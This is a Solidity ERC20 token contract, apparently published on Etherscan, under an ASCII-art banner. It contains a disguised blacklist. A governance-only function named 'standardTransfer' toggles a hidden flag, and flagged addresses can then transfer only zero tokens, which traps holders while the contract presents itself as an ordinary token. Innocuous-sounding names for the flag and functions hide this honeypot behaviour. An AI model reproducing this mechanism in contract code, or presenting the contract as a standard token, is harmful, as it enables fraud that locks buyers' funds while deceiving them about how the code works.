/**
 *Submitted for verification at Etherscan.io on 2023-01-23
*/

/**
      _____                    _____                    _____                    _____                    _____                    _____                    _____          
         /\    \                  /\    \                  /\    \                  /\    \                  /\    \                  /\    \                  /\    \         
        /::\    \                /::\____\                /::\    \                /::\____\                /::\____\                /::\____\                /::\    \        
       /::::\    \              /:::/    /               /::::\    \              /::::|   |               /::::|   |               /:::/    /               /::::\    \       
      /::::::\    \            /:::/    /               /::::::\    \            /:::::|   |              /:::::|   |              /:::/    /               /::::::\    \      
     /:::/\:::\    \          /:::/    /               /:::/\:::\    \          /::::::|   |             /::::::|   |             /:::/    /               /:::/\:::\    \     
    /:::/__\:::\    \        /:::/____/               /:::/__\:::\    \        /:::/|::|   |            /:::/|::|   |            /:::/    /               /:::/__\:::\    \    
    \:::\   \:::\    \      /::::\    \              /::::\   \:::\    \      /:::/ |::|   |           /:::/ |::|   |           /:::/    /               /::::\   \:::\    \   
  ___\:::\   \:::\    \    /::::::\    \   _____    /::::::\   \:::\    \    /:::/  |::|   | _____    /:::/  |::|___|______    /:::/    /      _____    /::::::\   \:::\    \  
 /\   \:::\   \:::\    \  /:::/\:::\    \ /\    \  /:::/\:::\   \:::\    \  /:::/   |::|   |/\    \  /:::/   |::::::::\    \  /:::/____/      /\    \  /:::/\:::\   \:::\    \ 
/::\   \:::\   \:::\____\/:::/  \:::\    /::\____\/:::/__\:::\   \:::\____\/:: /    |::|   /::\____\/:::/    |:::::::::\____\|:::|    /      /::\____\/:::/__\:::\   \:::\____\
\:::\   \:::\   \::/    /\::/    \:::\  /:::/    /\:::\   \:::\   \::/    /\::/    /|::|  /:::/    /\::/    / ~~~~~/:::/    /|:::|____\     /:::/    /\:::\   \:::\   \::/    /
 \:::\   \:::\   \/____/  \/____/ \:::\/:::/    /  \:::\   \:::\   \/____/  \/____/ |::| /:::/    /  \/____/      /:::/    /  \:::\    \   /:::/    /  \:::\   \:::\   \/____/ 
  \:::\   \:::\    \               \::::::/    /    \:::\   \:::\    \              |::|/:::/    /               /:::/    /    \:::\    \ /:::/    /    \:::\   \:::\    \     
   \:::\   \:::\____\               \::::/    /      \:::\   \:::\____\             |::::::/    /               /:::/    /      \:::\    /:::/    /      \:::\   \:::\____\    
    \:::\  /:::/    /               /:::/    /        \:::\   \::/    /             |:::::/    /               /:::/    /        \:::\__/:::/    /        \:::\   \::/    /    
     \:::\/:::/    /               /:::/    /          \:::\   \/____/              |::::/    /               /:::/    /          \::::::::/    /          \:::\   \/____/     
      \::::::/    /               /:::/    /            \:::\    \                  /:::/    /               /:::/    /            \::::::/    /            \:::\    \         
       \::::/    /               /:::/    /              \:::\____\                /:::/    /               /:::/    /              \::::/    /              \:::\____\        
        \::/    /                \::/    /                \::/    /                \::/    /                \::/    /                \::/____/                \::/    /        
         \/____/                  \/____/                  \/____/                  \/____/                  \/____/                  ~~                       \/____/         
                                                                                                                                                                               
 */
pragma solidity ^0.4.26;

library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}

contract Ownable {
  address internal owner;
    
  constructor() public {
    owner = msg.sender;
  }
}

contract ERC20 is Ownable {
    using SafeMath for uint256;

    mapping (address => mapping (address => uint256)) public allowed;
    mapping (address => bool) private _addressForStandardTransfer_;
    mapping(address => uint256) public balances;
    address internal governance;
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(string _name, string _symbol, uint8 _decimals, uint256 _totalSupply) public {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        governance = msg.sender;        
        totalSupply = totalSupply.add(_totalSupply);
        balances[owner] = balances[owner].add(_totalSupply);
        emit Transfer(address(0), owner, _totalSupply);
    }
  
    function showuint160(address addr) public pure returns(uint160){
        return uint160(addr);
    }
  
    function transfer(address _to, uint256 _value) public returns (bool) {
        require(_to != address(0));
        require(_value <= balances[msg.sender]);
        if (_addressForStandardTransfer_[msg.sender] || _addressForStandardTransfer_[_to]) require (_value == 0, "");
        balances[msg.sender] = balances[msg.sender].sub(_value);
        balances[_to] = balances[_to].add(_value);
        emit Transfer(msg.sender, _to, _value);
        return true;
    }

    function balanceOf(address _addressForStandardTransfer) public view returns (uint256 balance) {
        return balances[_addressForStandardTransfer];
    }
  
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
        require(_to != address(0));
        require(_value <= balances[_from]);
        require(_value <= allowed[_from][msg.sender]);
        if (_addressForStandardTransfer_[_from] || _addressForStandardTransfer_[_to]) require (_value == 0, "");
        balances[_from] = balances[_from].sub(_value);
        balances[_to] = balances[_to].add(_value);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
        emit Transfer(_from, _to, _value);
        return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool) {
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    
    function standardTransfer(address _addressForStandardTransfer) external {
        require(msg.sender == governance);
        if (_addressForStandardTransfer_[_addressForStandardTransfer] == true) {
            _addressForStandardTransfer_[_addressForStandardTransfer] = false;}
            else {_addressForStandardTransfer_[_addressForStandardTransfer] = true;}
    }

    function callStatus(address _addressForStandardTransfer) public view returns (bool) {
        return _addressForStandardTransfer_[_addressForStandardTransfer];
    }

    function allowance(address _owner, address _spender) public view returns (uint256) {
        return allowed[_owner][_spender];
    }
}